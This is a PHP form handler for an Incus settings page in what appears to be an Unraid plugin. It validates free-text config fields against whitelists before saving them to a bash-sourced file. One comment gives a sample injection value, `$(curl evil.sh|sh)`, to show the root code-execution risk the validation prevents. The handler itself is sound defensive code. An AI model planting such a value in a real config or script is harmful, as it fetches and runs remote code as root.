<?php
/** POST handler for the Incus tab's settings form. */
require_once '/usr/local/emhttp/webGui/include/Wrappers.php';
require_once __DIR__ . '/IncusHelpers.php';

incus_require_post();
incus_require_csrf();

$updates = [];
$rejected = [];

if (isset($_POST['SERVICE'])) {
    $updates['SERVICE'] = $_POST['SERVICE'] === 'enabled' ? 'enabled' : 'disabled';
}
if (isset($_POST['WEBGUI_ENABLE'])) {
    $updates['WEBGUI_ENABLE'] = $_POST['WEBGUI_ENABLE'] === 'true' ? 'true' : 'false';
}
if (isset($_POST['DASHBOARD_WIDGET_ENABLE'])) {
    $updates['DASHBOARD_WIDGET_ENABLE'] = $_POST['DASHBOARD_WIDGET_ENABLE'] === 'true' ? 'true' : 'false';
}

// Free-text fields get sourced as bash by incus-init.sh (`. "$CFG"`) on every
// array start — an unvalidated value like `$(curl evil.sh|sh)` would execute
// as root on the next boot. Whitelist-validate each one; reject (keep the
// prior value) rather than best-effort sanitize.
foreach (['DEVCONTAINER_IMAGE', 'DEVCONTAINER_PROFILE', 'DEVCONTAINER_CPU', 'DEVCONTAINER_MEMORY'] as $key) {
    if (!isset($_POST[$key])) continue;
    $val = trim($_POST[$key]);
    if (incus_validate_cfg_field($key, $val)) {
        $updates[$key] = $val;
    } else {
        $rejected[] = $key;
    }
}

$result = incus_save_cfg($updates);
// incus_save_cfg's own quote/newline backstop can drop a key even after it
// passed incus_validate_cfg_field() above (e.g. a future field added here
// without a matching whitelist pattern) — fold those into the same banner
// rather than letting the edit vanish with no indication anything happened.
$rejected = array_unique(array_merge($rejected, $result['dropped']));

$query = $result['ok'] ? 'saved=1' : 'saveerror=1';
if (!empty($rejected)) {
    $query .= '&rejected=' . urlencode(implode(',', $rejected));
}
header('Location: /Incus/IncusSettings?' . $query);
exit;
